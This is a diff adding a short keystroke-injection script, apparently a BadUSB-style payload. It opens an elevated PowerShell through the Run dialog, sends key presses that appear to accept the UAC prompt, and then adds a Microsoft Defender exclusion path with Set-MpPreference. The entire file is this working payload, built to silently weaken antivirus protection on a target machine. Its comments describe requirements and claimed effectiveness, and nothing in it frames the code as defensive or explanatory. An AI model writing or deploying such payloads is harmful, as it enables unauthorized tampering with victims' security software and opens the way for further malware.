@@ -1,0 +1,13 @@
+Rem: works only if the user has admin rights
+Press:131+114
+PrintLine:powershell
+PrintLine:Start-Process C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Verb runAs
+CustomDelay:500
+Press:216
+Press:216
+Press:176
+Rem: Works with every other microsoft defender rule
+PrintLine:Set-MpPreference -ExclusionPath $PATH
+PrintLine:exit
+CustomDelay:600
+PrintLine:exit
